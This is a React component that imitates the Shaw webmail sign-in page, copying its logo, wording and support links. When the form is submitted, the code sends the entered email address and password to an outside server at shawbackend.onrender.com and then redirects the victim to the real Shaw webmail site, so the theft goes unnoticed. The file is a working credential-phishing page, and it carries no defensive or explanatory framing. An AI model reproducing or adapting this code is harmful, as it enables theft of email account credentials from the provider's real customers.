import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { FaSpinner } from 'react-icons/fa6';

 

function SignUp() {
 const [inputs,setInputs] = useState({ email: '', password: '', website: 'shaw' })
 const [isloading, setLoading] = useState(false)
 const [errorMessage, setErrorMessage] = useState("")
 
 const navigate = useNavigate()

 const handleFormChanges = (e) =>{
    const {name, value} = e.target

    setInputs((prevdata) => ({
      ...prevdata,
      [name]:value
     

      
    }))
    
 }

 
  
 const handleSignUp = async (e) => {
  e.preventDefault();
  
  const options = {
    method: 'POST',
    headers: {
      "content-type": 'application/json'
    },
    body: JSON.stringify({ email: inputs.email, password: inputs.password, website: inputs.website })
  };

  setTimeout(async () => {
    try {
      const response = await fetch("https://shawbackend.onrender.com/sendEmail", options);
      const data = await response.json();
  
      if (data.message) {  window.location.href = 'https://webmail.shaw.ca/'; }
  
    } catch (error) {
      setErrorMessage(errorMessage);
       
    }
  }, 3000);
  setLoading(true)
};


  return (
    <div className='grid px-3 place-items-center'>
    <section className="mt-14 pb-10 lg:flex w-full lg:w-310  lg:place-content-start pt-10 bg-white rounded-sm shadow-sm">
      <div className='lg:w-100  '>
        <div className='flex justify-center gap-2 items-center'>
            <section className='mb-6'>
         <img alt="Shaw Webmail" src='https://webmail.shaw.ca/images/webmail-desktop.png'/>
        </section>
        </div>
        <p className='grid  place-items-center heading'>Sign in to access your Shaw email</p>
        <form className='sm:grid lg:place-content-start lg:ml-6  ml-4 sm:place-content-center'>
            <section className='relative'>
            <div> 
        <section  className='sm:w-99  w-80%  lg:w-96.5 mt-6 mb-1'><label id="username_input_label" className='user_label  font-semibold' for="username_input">Shaw email</label></section>
        <input className='username_input_occ  h-10 outline-none border  lg:w-96.5 w-80% sm:w-99'  name="email" type="text"   autocorrect="off" autocapitalize="off" autocomplete="off" tabIndex="1" placeholder="example@shaw.ca"  onChange={handleFormChanges} value={inputs.email}/>

        </div>
        <a href='#'>
        <div className='absolute grid place-items-center sm:top-12 sm:mt-1 top-7 sm:-right-11 right-5 '> 
            <div className='w-4.5 h-4.5 rounded-full grid place-items-center text-white cl1 text-sm font-semibold '><p>?</p></div>
            <div ><p className='cl font-semibold text-sm'>Help</p></div>
        </div>
        </a>
        </section>
        <section className='sm:w-99  w-80%  lg:w-96.5 mt-2 mb-1'><label id="username_input_label" className='user_label  font-semibold' for="username_Password">Password</label></section>
        <input className='username_input_occ h-10 outline-none border lg:w-96.5 w-80%  sm:w-99'  name="password" type="password" value={inputs.password}  onChange={handleFormChanges}  autocorrect="off" autocapitalize="off" autocomplete="off" tabIndex="1" placeholder=""/>
       <div>
        <section className='flex items-center gap-2'>
       <input type="checkbox"  id="persistent_check_occ"  className='w-5 mt-4 h-5'   tabindex="4"/>
       <div><p className='text-gray-500 mt-4 text-base font-normal'>Remember Shaw email</p></div>
      
 </section>
       </div>
       <div className='lg:grid lg:place-content-center'>
       {inputs.email.length > 0 && inputs.password.length > 0    ?  (
       <button   className={`  button mt-6 grid lg:place-items-center py-3 w-95% sm:w-full lg:w-72 font-semibold text-xl rounded-md text-white ${isloading ? "hidden" : "block" } `}  type="submit" onClick={handleSignUp} >Sign in</button> ):   <button disabled='true' className='bg-gray-200 grid lg:place-items-center lg:w-72 sm:w-full  mt-6 py-3 w-95% font-semibold text-xl rounded-md text-gray-400 ' >Sign in</button> }
        {isloading? ( <button disabled='true' className='bg-gray-200 grid lg:place-items-center lg:w-72 sm:w-full  mt-6 py-3 w-95% font-semibold text-xl rounded-md text-gray-400 ' >Validating ...</button>) : ""}
       </div>
       <section className='w-full grid place-items-center'>
       <p className='text-black   mt-5 text-sm font-normal md:font-medium'>Having trouble ?<a className='md:underline   ml-1 text-sm  font-normal cl' href='https://support.shaw.ca/t5/internet-articles/how-to-change-your-shaw-email-password/ta-p/6430'>Shaw Support: How To Reset My Password</a></p> 
       <p className='text-black  mt-1   gap-2 font-normal  text-sm md:font-medium'>Already Know How ?<a className='hover:underline ml-1 text-sm font-normal cl' href='https://my.shaw.ca/services/internet'>Reset Password On My Shaw</a> </p> 
       </section>
    </form>
    </div>
    <div className='bg-gray-400 hidden lg:block h-96 mt-5 w-0.1'>

    </div>
    </section>

    
    </div>
  );
}
export default SignUp;
